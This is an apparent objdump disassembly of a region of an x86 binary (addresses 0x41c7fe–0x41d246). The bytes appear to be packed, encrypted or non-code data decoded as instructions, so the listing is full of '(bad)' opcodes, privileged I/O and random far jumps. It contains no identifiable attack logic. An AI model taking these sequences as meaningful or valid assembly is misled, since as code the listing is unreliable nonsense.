  41c7fe:	adc    al,0x94
  41c800:	aas    
  41c801:	push   es
  41c802:	and    ebp,ebp
  41c804:	jp     0x41c836
  41c806:	jnp    0x41c796
  41c808:	add    bh,cl
  41c80a:	aam    0x84
  41c80c:	test   BYTE PTR [ecx],al
  41c80e:	jne    0x41c83f
  41c810:	fwait
  41c811:	jmp    0x41c7c2
  41c813:	sahf   
  41c814:	xchg   ebx,eax
  41c815:	ins    DWORD PTR es:[edi],dx
  41c816:	ja     0x41c7fd
  41c818:	mov    ds:0xbf2f5cf4,al
  41c81d:	js     0x41c819
  41c81f:	daa    
  41c820:	sti    
  41c821:	lock xchg BYTE PTR [ecx],bh
  41c824:	pop    edi
  41c825:	rcl    BYTE PTR [ebx-0x5fd4e6dd],1
  41c82b:	cmp    ch,BYTE PTR [eax-0x124f90bc]
  41c831:	dec    edi
  41c832:	push   cs
  41c833:	add    BYTE PTR [eax+0x6],ch
  41c836:	or     BYTE PTR [ebx+ebx*1],ch
  41c839:	cdq    
  41c83a:	mov    esi,0x3144db79
  41c83f:	mov    ch,0xb0
  41c841:	push   0x58
  41c843:	jbe    0x41c822
  41c845:	fwait
  41c846:	inc    edx
  41c847:	add    DWORD PTR [edi],0x5a1826ca
  41c84d:	add    DWORD PTR [ebx+0x2d],edx
  41c850:	outs   dx,BYTE PTR ds:[esi]
  41c851:	shl    BYTE PTR [esp+eiz*8],cl
  41c854:	pusha  
  41c855:	or     al,0x88
  41c857:	cs mov ebx,0x61ce26cb
  41c85d:	sbb    DWORD PTR ds:0xcaf3eb27,eax
  41c863:	mov    esi,0x3149baf6
  41c868:	mov    al,0x2
  41c86a:	dec    edx
  41c86b:	daa    
  41c86c:	cwde   
  41c86d:	cld    
  41c86e:	xchg   ebp,eax
  41c86f:	xchg   esi,eax
  41c870:	fiadd  WORD PTR [esi+0xa7ad368]
  41c876:	sti    
  41c877:	adc    BYTE PTR [edx-0x7b],ah
  41c87a:	aam    0x5b
  41c87c:	mov    ebx,0x7defb466
  41c881:	cmp    al,0x27
  41c883:	or     DWORD PTR [ebx],0xffffffdc
  41c886:	fcom   DWORD PTR [ebp+0x49f26d3c]
  41c88c:	fmul   QWORD PTR [ebp+0x1e]
  41c88f:	push   eax
  41c890:	loopne 0x41c8f9
  41c892:	add    eax,DWORD PTR [eax]
  41c894:	pop    edx
  41c895:	and    BYTE PTR [edi],bl
  41c897:	(bad)  
  41c899:	sub    dl,dh
  41c89b:	pop    eax
  41c89c:	mov    esi,0xa985eedf
  41c8a1:	push   0xffffffd1
  41c8a3:	xor    eax,ebx
  41c8a5:	std    
  41c8a6:	xchg   edx,eax
  41c8a7:	test   eax,0x245dcc5a
  41c8ac:	xchg   ecx,eax
  41c8ad:	ins    DWORD PTR es:[edi],dx
  41c8ae:	xchg   edx,eax
  41c8af:	mul    BYTE PTR [ecx+0x58]
  41c8b2:	scas   eax,DWORD PTR es:[edi]
  41c8b3:	inc    ebp
  41c8b4:	cmp    ecx,edi
  41c8b6:	or     al,0x83
  41c8b8:	sbb    edx,edi
  41c8ba:	mov    edi,0xd60a4568
  41c8bf:	(bad)  
  41c8c0:	lods   eax,DWORD PTR ds:[esi]
  41c8c1:	int3   
	...
  41c932:	add    BYTE PTR [eax],al
  41c934:	ret    
  41c935:	mov    esp,0xf87f4844
  41c93a:	iret   
  41c93b:	mov    edi,0x4f0c9749
  41c940:	or     DWORD PTR [edi+eax*8+0x13458e4],0xf600
  41c94b:	add    BYTE PTR [eax],bh
  41c94d:	inc    ecx
  41c94e:	dec    ebx
  41c94f:	outs   dx,BYTE PTR ds:[esi]
  41c950:	jbe    0x41c990
  41c952:	in     al,dx
  41c953:	sub    eax,0xff54eddd
  41c958:	pop    ebx
  41c959:	push   esi
  41c95a:	mov    al,ds:0x32ef971b
  41c95f:	(bad)  
  41c960:	xlat   BYTE PTR ds:[ebx]
  41c961:	pop    DWORD PTR [ecx+0x8]
  41c964:	int    0x92
  41c966:	push   0x26f31828
  41c96b:	lea    edx,[esi]
  41c96d:	xchg   BYTE PTR [ecx],cl
  41c96f:	cmp    al,0x1b
  41c971:	js     0x41c90e
  41c973:	sbb    BYTE PTR [ebp+0x2d6f146d],ch
  41c979:	lock jns 0x41c948
  41c97c:	les    esi,FWORD PTR [ebp+0x7e]
  41c97f:	jge    0x41c952
  41c981:	inc    BYTE PTR [esi+0x3c72bc36]
  41c987:	shl    esp,0xe9
  41c98a:	inc    ebx
  41c98b:	inc    ecx
  41c98c:	test   al,0x1b
  41c98e:	icebp  
  41c98f:	data16 xor bl,BYTE PTR [edx]
  41c992:	in     eax,dx
  41c993:	sbb    BYTE PTR [esi-0x44c8f8da],bl
  41c999:	test   eax,0xd3348f2b
  41c99e:	and    BYTE PTR [eax],bl
  41c9a0:	sub    dh,cl
  41c9a2:	inc    esp
  41c9a3:	pop    ss
  41c9a4:	mov    edx,0x9df0d458
  41c9a9:	sti    
  41c9aa:	stos   DWORD PTR es:[edi],eax
  41c9ab:	pop    ds
  41c9ac:	jne    0x41c981
  41c9ae:	mov    dl,0x27
  41c9b0:	dec    edx
  41c9b1:	aaa    
  41c9b2:	mov    al,ds:0x8162264a
  41c9b7:	add    eax,0x23d13fee
  41c9bc:	sbb    esi,DWORD PTR [esp+ecx*4+0x80cca96]
  41c9c3:	mov    esp,0xa290e093
  41c9c8:	pop    esi
  41c9c9:	cmp    DWORD PTR [esi+eax*4-0x31ef442e],0x11baddee
  41c9d4:	and    DWORD PTR [eax+0x27],eax
  41c9d7:	fst    QWORD PTR [esi]
  41c9d9:	(bad)  
  41c9da:	in     eax,dx
  41c9db:	cli    
  41c9dc:	daa    
  41c9dd:	push   ebp
  41c9de:	test   eax,esp
  41c9e0:	jo     0x41c9e0
  41c9e2:	hlt    
  41c9e3:	test   BYTE PTR [eax+0x9],bl
  41c9e6:	push   es
  41c9e7:	dec    edi
  41c9e8:	jg     0x41c9d6
  41c9ea:	mov    esi,0x75ef311e
  41c9ef:	shl    BYTE PTR [ecx+0x1e74ab4d],0x41
  41c9f6:	sub    al,0x18
  41c9f8:	pop    ecx
  41c9f9:	jmp    0xbb511c6f
  41c9fe:	hlt    
  41c9ff:	cld    
  41ca00:	mov    bh,0xef
  41ca02:	or     ah,BYTE PTR [esi+0x644eda3c]
  41ca08:	sub    BYTE PTR [edi],bl
  41ca0a:	jb     0x41c9d7
  41ca0c:	(bad)  
  41ca0d:	scas   eax,DWORD PTR es:[edi]
  41ca0e:	sbb    al,0x3b
  41ca10:	fs (bad) 
  41ca12:	mov    ebp,DWORD PTR ds:0x631dfd45
  41ca18:	test   al,0x50
  41ca1a:	sub    cl,BYTE PTR [esi-0x26]
  41ca1d:	xor    eax,0x4111c873
  41ca22:	cs popa 
  41ca24:	shr    DWORD PTR [edi+eiz*2+0x17],0x8e
  41ca29:	ds jmp 0x337c:0xaece9b46
  41ca31:	test   BYTE PTR [edx],0x8e
  41ca34:	nop
  41ca35:	daa    
  41ca36:	pop    ss
  41ca37:	mov    eax,ds:0xd091aaa3
  41ca3c:	push   edx
  41ca3d:	stos   BYTE PTR es:[edi],al
  41ca3e:	adc    al,bh
  41ca40:	repnz lea eax,[eax]
	...
  41cab3:	add    BYTE PTR [edx],cl
  41cab5:	mov    eax,0xbfb7aaa5
  41caba:	(bad)  
  41cabc:	sbb    eax,0xe0e2887e
  41cac1:	push   cs
  41cac2:	dec    ecx
  41cac3:	mov    BYTE PTR [esi+0x35],cl
  41cac6:	add    DWORD PTR [eax],eax
  41cac8:	test   BYTE PTR [eax],0x0
  41cacb:	add    BYTE PTR [ebx],ch
  41cacd:	mov    ds:0xe5e07385,eax
  41cad2:	jge    0x41caaf
  41cad4:	inc    ecx
  41cad5:	mov    al,0x5
  41cad7:	mov    ecx,0x64aca46f
  41cadc:	cmp    BYTE PTR [ecx+ebx*2-0x1f],ch
  41cae0:	pop    ebp
  41cae1:	and    al,0x35
  41cae3:	or     al,0xdc
  41cae5:	xchg   edi,eax
  41cae6:	sub    al,0x28
  41cae8:	out    dx,al
  41cae9:	fbld   TBYTE PTR [edx]
  41caeb:	sar    ecx,1
  41caed:	sbb    ebx,DWORD PTR [edx+edi*1-0x5ca348e0]
  41caf4:	arpl   WORD PTR [edx],cx
  41caf6:	mov    ?,WORD PTR [ebx+edi*4+0x7]
  41cafa:	inc    ebp
  41cafb:	in     al,0x8c
  41cafd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cafe:	dec    esp
  41caff:	xor    BYTE PTR [esi-0x4986b6fe],bl
  41cb05:	and    DWORD PTR [edi+0x3c5d2979],0xc088b526
  41cb0f:	add    al,0x84
  41cb11:	test   al,0xb8
  41cb13:	jl     0x41cb2d
  41cb15:	pop    ebx
  41cb16:	mov    esi,0x103247dc
  41cb1b:	and    eax,0xefd5902f
  41cb20:	mov    eax,0x818fffc8
  41cb25:	(bad)  
  41cb26:	pop    ebp
  41cb27:	stos   BYTE PTR es:[edi],al
  41cb28:	mov    ss,WORD PTR [esi+0x37]
  41cb2b:	or     ah,BYTE PTR [esi-0x6e]
  41cb2e:	rcl    DWORD PTR [ebx],cl
  41cb30:	sub    eax,0x6c3153f7
  41cb35:	je     0x41cac7
  41cb37:	rol    BYTE PTR [ebx+0x23b961e7],1
  41cb3d:	adc    eax,0x26eedf93
  41cb42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb43:	dec    esi
  41cb44:	inc    edx
  41cb45:	iret   
  41cb46:	add    ecx,DWORD PTR [ebp-0x1bc6ed67]
  41cb4c:	add    BYTE PTR [edx-0x2e],al
  41cb4f:	xchg   esp,eax
  41cb50:	mov    bh,0xc4
  41cb52:	outs   dx,BYTE PTR fs:[esi]
  41cb54:	lock sti 
  41cb56:	xor    eax,0xcb0aa626
  41cb5b:	(bad)  
  41cb5c:	pop    ecx
  41cb5d:	cld    
  41cb5e:	cs inc eax
  41cb60:	nop
  41cb61:	ror    bl,1
  41cb63:	mov    ah,0x6c
  41cb65:	je     0x41cb74
  41cb67:	mov    ebx,DWORD PTR [ecx+0x3d]
  41cb6a:	nop
  41cb6b:	mov    ch,0xf
  41cb6d:	dec    esi
  41cb6e:	std    
  41cb6f:	xchg   edx,eax
  41cb70:	jb     0x41cb4a
  41cb72:	cld    
  41cb73:	sub    eax,DWORD PTR [ecx+esi*1]
  41cb76:	scas   al,BYTE PTR es:[edi]
  41cb77:	xchg   ecx,eax
  41cb78:	xchg   edi,eax
  41cb79:	mov    eax,0xf611a9ab
  41cb7e:	and    edx,DWORD PTR [eax]
  41cb80:	mov    edi,0x65648f1
  41cb85:	push   ss
  41cb86:	repz es jge 0x41cbc3
  41cb8a:	jns    0x41cbc6
  41cb8c:	in     al,dx
  41cb8d:	mov    esp,0xe9546e21
  41cb92:	cmp    al,0x63
  41cb94:	pop    edi
  41cb95:	test   DWORD PTR [esi+0x66b0a7a9],ebx
  41cb9b:	adc    DWORD PTR [edx+0x36],eax
  41cb9e:	imul   eax,DWORD PTR [edx],0xffffffbe
  41cba1:	adc    edi,DWORD PTR [edx+0x26ceb231]
  41cba7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cba8:	mov    ebx,0xba887bfa
  41cbad:	mov    esi,0xea286a1
  41cbb2:	adc    DWORD PTR [ecx+0x16],0xe39b42e6
  41cbb9:	xchg   ebx,eax
  41cbba:	ret    0x78fb
  41cbbd:	loop   0x41cb86
  41cbbf:	inc    edx
  41cbc0:	push   edx
  41cbc1:	add    BYTE PTR [eax],0x0
	...
  41cc34:	shl    BYTE PTR [edx],cl
  41cc36:	cli    
  41cc37:	clc    
  41cc38:	cli    
  41cc39:	clc    
  41cc3a:	sar    BYTE PTR [edx],cl
  41cc3c:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc3e:	inc    eax
  41cc3f:	aam    0x1f
  41cc41:	int3   
  41cc42:	and    al,0xbe
  41cc44:	inc    esp
  41cc45:	add    DWORD PTR ss:[eax],eax
  41cc48:	test   BYTE PTR [eax],0x0
  41cc4b:	add    BYTE PTR ds:0xcb295e04,dl
  41cc51:	adc    eax,DWORD PTR [edi-0x27]
  41cc54:	mov    bl,0x80
  41cc56:	cld    
  41cc57:	popa   
  41cc58:	scas   eax,DWORD PTR es:[edi]
  41cc59:	cmp    eax,DWORD PTR [ebp+0x7a327215]
  41cc5f:	or     esp,DWORD PTR [edi]
  41cc61:	adc    esp,DWORD PTR [edx]
  41cc63:	cmp    dh,BYTE PTR [esi]
  41cc65:	pop    ebp
  41cc66:	jp     0x41cbe9
  41cc68:	mov    bl,0xa9
  41cc6a:	push   ss
  41cc6b:	xchg   ebx,eax
  41cc6c:	aaa    
  41cc6d:	mov    ds:0x532453f7,eax
  41cc72:	cdq    
  41cc73:	inc    ecx
  41cc74:	adc    esp,DWORD PTR [edx]
  41cc76:	jne    0x41cc72
  41cc78:	mov    ds:0xf91ee4d9,ax
  41cc7e:	mov    dl,0x14
  41cc80:	xor    DWORD PTR [ecx-0x49c1cc90],eax
  41cc86:	xchg   ecx,eax
  41cc87:	repnz xchg ebp,eax
  41cc89:	xor    eax,0x86840ab0
  41cc8e:	pop    esi
  41cc8f:	push   es
  41cc90:	sub    ecx,DWORD PTR [eax+0x3]
  41cc93:	dec    ecx
  41cc94:	xor    BYTE PTR [eax+0x7a],ah
  41cc97:	jle    0x41cc20
  41cc99:	mov    edi,0xcafbbc52
  41cc9e:	jo     0x41cc99
  41cca0:	mov    cl,0xc8
  41cca2:	cmp    cl,BYTE PTR [eax+0x0]
  41cca5:	in     eax,dx
  41cca6:	cld    
  41cca7:	mov    ebx,0x21a64878
  41ccac:	xchg   edx,eax
  41ccad:	div    edx
  41ccaf:	aam    0xda
  41ccb1:	shl    BYTE PTR [esi+0x4f2a525e],0xe9
  41ccb8:	add    bl,BYTE PTR [esi-0x3a1243f5]
  41ccbe:	jb     0x41cc9d
  41ccc0:	std    
  41ccc1:	or     eax,0x8a09c92d
  41ccc6:	scas   eax,DWORD PTR es:[edi]
  41ccc7:	aam    0x39
  41ccc9:	push   esp
  41ccca:	jne    0x41cd39
  41cccc:	rol    BYTE PTR [eax+0x1],0xe3
  41ccd0:	cmp    ecx,edx
  41ccd2:	ins    DWORD PTR es:[edi],dx
  41ccd3:	pop    esi
  41ccd4:	pop    edx
  41ccd5:	jg     0x41cc9d
  41ccd7:	dec    esi
  41ccd8:	das    
  41ccd9:	xor    BYTE PTR cs:[esi-0x36],0xee
  41ccde:	push   eax
  41ccdf:	jl     0x41cca9
  41cce1:	stc    
  41cce2:	je     0x41cc96
  41cce4:	loopne 0x41cd07
  41cce6:	jp     0x41cc96
  41cce8:	aas    
  41cce9:	daa    
  41ccea:	and    ebp,ebp
  41ccec:	xchg   edi,eax
  41cced:	ss shr edi,0x35
  41ccf1:	pop    edi
  41ccf2:	jecxz  0x41cc76
  41ccf4:	sub    BYTE PTR [ebx-0x3fee7787],bh
  41ccfa:	jmp    0x6e68:0x6a291409
  41cd01:	sub    eax,DWORD PTR [eax]
  41cd03:	jl     0x41cd75
  41cd05:	ja     0x41ccf3
  41cd07:	xchg   edi,eax
  41cd08:	jmp    0xb624:0x2ab38edf
  41cd0f:	ss aad 0x4
  41cd12:	cdq    
  41cd13:	imul   eax,ecx,0x73
  41cd16:	ins    DWORD PTR es:[edi],dx
  41cd17:	popf   
  41cd18:	and    ebx,ebx
  41cd1a:	(bad)  
  41cd1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd1c:	push   esi
  41cd1d:	push   DWORD PTR [esp+eiz*4+0x2b]
  41cd21:	mov    eax,0xcbc2dd2d
  41cd26:	inc    ebx
  41cd27:	cli    
  41cd28:	push   edx
  41cd29:	sbb    DWORD PTR ds:0xa91f46d9,ebx
  41cd2f:	leave  
  41cd30:	and    bh,BYTE PTR [eax]
  41cd32:	adc    eax,0x7769a7de
  41cd37:	pop    esi
  41cd38:	loop   0x41cd2c
  41cd3a:	(bad)  
  41cd3b:	out    0x3d,al
  41cd3d:	shr    BYTE PTR [eax],cl
  41cd3f:	cs mov bh,0xdc
	...
  41cdb2:	add    BYTE PTR [eax],al
  41cdb4:	test   DWORD PTR [ebp+0x7b9c6a9c],ecx
  41cdba:	imul   edi
  41cdbc:	push   ebp
  41cdbd:	call   0x71d4:0x1d39b1bb
  41cdc4:	cmp    dh,BYTE PTR [edi]
  41cdc6:	add    DWORD PTR [eax],eax
  41cdc8:	test   BYTE PTR [eax],0x0
  41cdcb:	add    BYTE PTR [edx],ch
  41cdcd:	xor    al,0xd7
  41cdcf:	dec    edx
  41cdd0:	pop    esp
  41cdd1:	(bad)  
  41cdd3:	pop    ss
  41cdd4:	mov    cs,WORD PTR ds:0x4d219351
  41cdda:	data16 sub BYTE PTR [ebx+0x76],bl
  41cdde:	mov    DWORD PTR [edi+ecx*2+0x14e8b97],esi
  41cde5:	xor    al,0x55
  41cde7:	or     BYTE PTR [edx-0x4c],cl
  41cdea:	shl    ecx,cl
  41cdec:	in     eax,0x79
  41cdee:	out    0x2c,eax
  41cdf0:	or     edi,DWORD PTR [edi+0x42]
  41cdf3:	mov    ch,dl
  41cdf5:	and    al,0x89
  41cdf7:	aas    
  41cdf8:	cdq    
  41cdf9:	pop    es
  41cdfa:	leave  
  41cdfb:	jae    0x41cddf
  41cdfd:	lods   al,BYTE PTR ds:[esi]
  41cdfe:	rol    DWORD PTR [ebx-0x1d],cl
  41ce01:	jmp    0x6c9e:0x843b503d
  41ce08:	mov    esp,0x208978c6
  41ce0d:	rcl    BYTE PTR [ebp+eax*1+0x5e],cl
  41ce11:	dec    ebp
  41ce12:	inc    edi
  41ce13:	pop    esi
  41ce14:	pop    edi
  41ce15:	adc    al,0x83
  41ce17:	fcmovnb st,st(7)
  41ce19:	add    al,0x63
  41ce1b:	sub    edi,DWORD PTR [edi+0x2a]
  41ce1e:	div    BYTE PTR [ebp+0x42]
  41ce21:	jno    0x41cdea
  41ce23:	pusha  
  41ce24:	and    DWORD PTR [edx+0x1d],0x45da0604
  41ce2b:	pusha  
  41ce2c:	pop    es
  41ce2d:	mov    ebp,0xceeec0c8
  41ce32:	pop    edx
  41ce33:	addr16 cmp dl,dh
  41ce36:	add    esi,DWORD PTR [edi+0x5a6fc715]
  41ce3c:	adc    ebx,DWORD PTR [esi+0x1fe7dc57]
  41ce42:	inc    esi
  41ce43:	cld    
  41ce44:	shl    BYTE PTR [eax-0x797c53ae],cl
  41ce4a:	and    bl,BYTE PTR [ecx+edi*1+0xc]
  41ce4e:	loop   0x41ce7b
  41ce50:	enter  0xa034,0x92
  41ce54:	xchg   ecx,eax
  41ce55:	xor    al,0x83
  41ce57:	push   esi
  41ce58:	cld    
  41ce59:	mov    DWORD PTR [edx-0x65],esp
  41ce5c:	xor    eax,0x41846014
  41ce61:	loop   0x41cde6
  41ce63:	loopne 0x41ce17
  41ce65:	mov    edi,0x86c8b57b
  41ce6a:	sbb    ebx,eax
  41ce6c:	and    DWORD PTR [bp+0x6df7],ecx
  41ce71:	test   DWORD PTR [esp+edx*4-0x36],ebp
  41ce75:	sbb    ch,bh
  41ce77:	pop    ecx
  41ce78:	in     al,0x80
  41ce7a:	xchg   BYTE PTR [edi+0x7bd7666],dl
  41ce80:	pop    esi
  41ce81:	xor    al,0x2f
  41ce83:	add    ebx,DWORD PTR ds:0xc62ffae
  41ce89:	mov    ecx,0x85395f14
  41ce8e:	mov    BYTE PTR [esi],bh
  41ce90:	xor    esp,edi
  41ce92:	mov    dh,0x80
  41ce94:	shl    BYTE PTR [edx+0x26],1
  41ce97:	stos   DWORD PTR es:[edi],eax
  41ce98:	icebp  
  41ce99:	test   BYTE PTR [edi],dh
  41ce9b:	(bad)  
  41ce9d:	lock jae 0x41cf0b
  41cea0:	xchg   ebp,eax
  41cea1:	xlat   BYTE PTR ds:[ebx]
  41cea3:	lods   eax,DWORD PTR ds:[esi]
  41cea4:	out    0xe4,al
  41cea6:	or     BYTE PTR [ebx-0x54],ah
  41cea9:	and    ebp,edi
  41ceab:	sub    al,0xef
  41cead:	and    ah,dh
  41ceaf:	inc    edx
  41ceb0:	adc    edx,ebx
  41ceb2:	inc    ecx
  41ceb3:	mov    BYTE PTR [eax-0x68f5bf8d],0xb1
  41ceba:	arpl   WORD PTR [edi],di
  41cebc:	pushf  
  41cebd:	or     BYTE PTR [esi+0x1f74dd],bl
	...
  41cf33:	add    BYTE PTR [ebx+esi*2+0x33],ah
  41cf37:	es aaa 
  41cf39:	data16 jne 0x41cfaf
  41cf3c:	cmc    
  41cf3d:	jle    0x41cf41
  41cf3f:	dec    esi
  41cf40:	lahf   
  41cf41:	cmp    BYTE PTR [ebx-0x21],0x30
  41cf45:	cmp    BYTE PTR [ecx],al
  41cf47:	add    dh,dh
  41cf49:	add    BYTE PTR [eax],al
  41cf4b:	add    bl,al
  41cf4d:	shl    edi,0xd2
  41cf50:	ss pop esp
  41cf52:	data16 mov ah,BYTE PTR [ebx]
  41cf55:	sub    eax,0xeb343775
  41cf5a:	xchg   DWORD PTR [eax+edx*8],edx
  41cf5d:	enter  0x4ffb,0x16
  41cf61:	cmp    BYTE PTR [esi],al
  41cf63:	cmp    al,0x15
  41cf65:	mov    dh,BYTE PTR [ecx+0x53]
  41cf68:	inc    edx
  41cf69:	jno    0x41cf85
  41cf6b:	jns    0x41cfcb
  41cf6d:	popa   
  41cf6e:	fisttp DWORD PTR [edi+ebx*1-0x11b2f3c5]
  41cf75:	call   0xda0f:0x52ccfb7
  41cf7c:	inc    ecx
  41cf7d:	pop    esi
  41cf7e:	ror    ecx,cl
  41cf80:	mov    edx,0xcb6cac85
  41cf85:	and    ecx,DWORD PTR [eax+0x3c]
  41cf88:	cmp    al,0xbf
  41cf8a:	add    BYTE PTR [esp],bl
  41cf8d:	cmp    DWORD PTR [ecx-0x6],edx
  41cf90:	repz cli 
  41cf92:	or     al,0xe9
  41cf94:	fs jns 0x41cf46
  41cf97:	mov    ecx,0x334b7224
  41cf9c:	pop    esp
  41cf9d:	lea    esi,[ecx+esi*8]
  41cfa0:	mov    gs,WORD PTR [edx-0x12b6f06a]
  41cfa6:	xchg   BYTE PTR [bp+si-0x2944],bh
  41cfab:	mov    ss,esi
  41cfad:	dec    eax
  41cfae:	in     al,0xa3
  41cfb0:	retf   0x235f
  41cfb3:	inc    ebx
  41cfb4:	(bad)  
  41cfb6:	fcom   DWORD PTR [eax+0x5da98d00]
  41cfbc:	push   ss
  41cfbd:	push   eax
  41cfbe:	jbe    0x41cff6
  41cfc0:	push   0x4f
  41cfc2:	popa   
  41cfc3:	push   ebx
  41cfc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cfc5:	and    al,0xd4
  41cfc7:	xlat   BYTE PTR ds:[ebx]
  41cfc8:	jb     0x41d00f
  41cfca:	dec    eax
  41cfcb:	inc    esp
  41cfcc:	mov    dl,0x85
  41cfce:	mov    ds,WORD PTR [esi-0x76]
  41cfd1:	repz push eax
  41cfd3:	pusha  
  41cfd4:	jle    0x41cf6b
  41cfd6:	rcl    BYTE PTR [edx+0x53],0xf5
  41cfda:	aaa    
  41cfdb:	mov    fs,WORD PTR [ebx]
  41cfdd:	ret    0x4c03
  41cfe0:	ror    BYTE PTR [edx],1
  41cfe2:	lods   eax,DWORD PTR ds:[esi]
  41cfe3:	push   esp
  41cfe4:	rol    edx,cl
  41cfe6:	clc    
  41cfe7:	xchg   ebx,eax
  41cfe8:	mov    ecx,DWORD PTR [ebx]
  41cfea:	push   esp
  41cfeb:	dec    ecx
  41cfec:	shl    BYTE PTR [edx],1
  41cfee:	scas   al,BYTE PTR es:[edi]
  41cfef:	mov    edx,0x96f176dd
  41cff4:	cwde   
  41cff5:	add    ebx,DWORD PTR [ebp-0x64a05279]
  41cffb:	cmc    
  41cffc:	imul   ebx,ebx,0x1f
  41cfff:	mov    eax,ds:0xaaeec016
  41d004:	or     BYTE PTR [esi-0x78f5d41f],bh
  41d00a:	je     0x41d05c
  41d00c:	and    al,0x2c
  41d00e:	xlat   BYTE PTR ds:[ebx]
  41d00f:	gs nop
  41d011:	adc    cl,BYTE PTR [eax-0x5f26613b]
  41d017:	aam    0xa8
  41d019:	mov    edi,0x8b3c62b1
  41d01e:	cld    
  41d01f:	sbb    ch,ah
  41d021:	adc    edi,DWORD PTR [ebp-0x69]
  41d024:	dec    edx
  41d025:	adc    eax,DWORD PTR [edi+0x1e]
  41d028:	inc    edx
  41d029:	fcomp  st(6)
  41d02b:	inc    edx
  41d02c:	adc    eax,0x37e3b761
  41d031:	stc    
  41d032:	icebp  
  41d033:	dec    eax
  41d034:	mov    ebx,esi
  41d036:	jp     0x41cffc
  41d038:	je     0x41d00c
  41d03a:	and    BYTE PTR [ecx-0x21a976c4],cl
  41d040:	enter  0x70,0x0
	...
  41d0b4:	(bad)  [edx-0x5f]
  41d0b7:	clc    
  41d0b8:	mov    bl,0xfb
  41d0ba:	fldcw  WORD PTR [ebx-0x56]
  41d0bd:	cwde   
  41d0be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0bf:	adc    BYTE PTR [edx+0x2639bbe4],0x39
  41d0c6:	add    DWORD PTR [eax],eax
  41d0c8:	test   BYTE PTR [eax],0x0
  41d0cb:	add    BYTE PTR [esi+0x466d4d11],al
  41d0d1:	mov    cl,0x19
  41d0d3:	popa   
  41d0d4:	xor    cl,BYTE PTR [esi-0x1f]
  41d0d7:	mov    ds:0xb44dc49,al
  41d0dc:	adc    esi,DWORD PTR [edx]
  41d0de:	aad    0x7b
  41d0e0:	retf   0xad79
  41d0e3:	loope  0x41d13a
  41d0e5:	fstp   DWORD PTR [edi-0x2baea002]
  41d0eb:	ins    BYTE PTR es:[edi],dx
  41d0ec:	add    al,0x57
  41d0ee:	jbe    0x41d0b2
  41d0f0:	pop    edi
  41d0f1:	adc    DWORD PTR [ebx-0x37],ebp
  41d0f4:	jmp    0xe53f:0x48c951
  41d0fb:	imul   ebp,esi,0x42ca9e18
  41d101:	push   0x7
  41d103:	lods   al,BYTE PTR ds:[esi]
  41d104:	(bad)
  41d107:	sbb    eax,0x4484e7e6
  41d10c:	sub    eax,0x5a153eef
  41d111:	mov    ch,0xef
  41d113:	(bad)  [edi-0xb9c373c]
  41d119:	fdivr  QWORD PTR [edx-0x3e4b8fca]
  41d11f:	loopne 0x41d0bf
  41d121:	sub    bh,BYTE PTR [esi-0x3680bc8f]
  41d127:	out    0x2d,al
  41d129:	shr    DWORD PTR [esi+ecx*8],cl
  41d12c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d12d:	push   esi
  41d12e:	cmp    al,0x14
  41d130:	cmc    
  41d131:	xor    esp,DWORD PTR [ebx-0x6ab92be3]
  41d137:	xchg   ecx,eax
  41d138:	sahf   
  41d139:	mov    edx,DWORD PTR [edx+0xc]
  41d13c:	inc    ebp
  41d13d:	xchg   edi,eax
  41d13e:	pop    es
  41d13f:	fisub  WORD PTR [edx+0x669d33aa]
  41d145:	mov    bh,0x4f
  41d147:	fsubr  st,st(5)
  41d149:	aam    0xaa
  41d14b:	fnstsw WORD PTR [ebx-0x1]
  41d14e:	mov    ds:0x109af9c4,eax
  41d153:	xchg   BYTE PTR [eax],ah
  41d155:	lahf   
  41d156:	adc    al,0x8f
  41d158:	or     al,0x5f
  41d15a:	mov    WORD PTR [ecx+0x4b1d5b57],?
  41d160:	push   es
  41d161:	mov    esp,0x10aa719c
  41d166:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d167:	jnp    0x41d1ad
  41d169:	loop   0x41d144
  41d16b:	repz sahf 
  41d16d:	add    ch,BYTE PTR [ebx]
  41d16f:	rcl    BYTE PTR [edi-0x5e],0xf7
  41d173:	xchg   esi,eax
  41d174:	xchg   ch,al
  41d176:	mov    cl,0xef
  41d178:	jle    0x41d14f
  41d17a:	int    0xe6
  41d17c:	cs mov dl,0xd7
  41d17f:	popa   
  41d180:	pop    edx
  41d181:	ins    DWORD PTR es:[edi],dx
  41d182:	or     DWORD PTR [esi+0x64],esp
  41d185:	pop    ds
  41d186:	stos   DWORD PTR es:[edi],eax
  41d187:	pop    edx
  41d189:	stos   DWORD PTR es:[edi],eax
  41d18a:	pop    ecx
  41d18b:	mov    bl,0x50
  41d18d:	int    0x96
  41d18f:	add    al,0xcd
  41d191:	push   ebx
  41d192:	push   ecx
  41d193:	mov    al,0xd
  41d195:	pop    edi
  41d196:	(bad)  
  41d198:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d199:	pop    es
  41d19a:	adc    eax,0xb870d6b5
  41d19f:	pop    ebx
  41d1a0:	sbb    DWORD PTR [esi+0xf],ebp
  41d1a3:	pop    ebp
  41d1a4:	test   eax,0xf25e8626
  41d1a9:	inc    esp
  41d1aa:	ret    0xf061
  41d1ad:	inc    esi
  41d1ae:	push   edi
  41d1af:	jbe    0x41d226
  41d1b1:	pop    es
  41d1b2:	in     eax,dx
  41d1b3:	inc    edx
  41d1b4:	push   edi
  41d1b5:	leave  
  41d1b6:	jle    0x41d1bb
  41d1b8:	aam    0x5a
  41d1ba:	dec    esi
  41d1bb:	pop    edi
  41d1bc:	in     al,0x21
  41d1be:	sbb    edi,ebp
  41d1c0:	mov    ebp,edx
	...
  41d232:	add    BYTE PTR [eax],al
  41d234:	repz and ebp,ecx
  41d237:	push   ebp
  41d238:	(bad)  
  41d23a:	sti    
  41d23b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d23c:	pop    edi
  41d23d:	push   edx
  41d23e:	jo     0x41d1ff
  41d240:	iret   
  41d241:	aaa    
  41d242:	mov    bh,0x7
  41d244:	sbb    al,0x3a
  41d246:	add    DWORD PTR [eax],eax
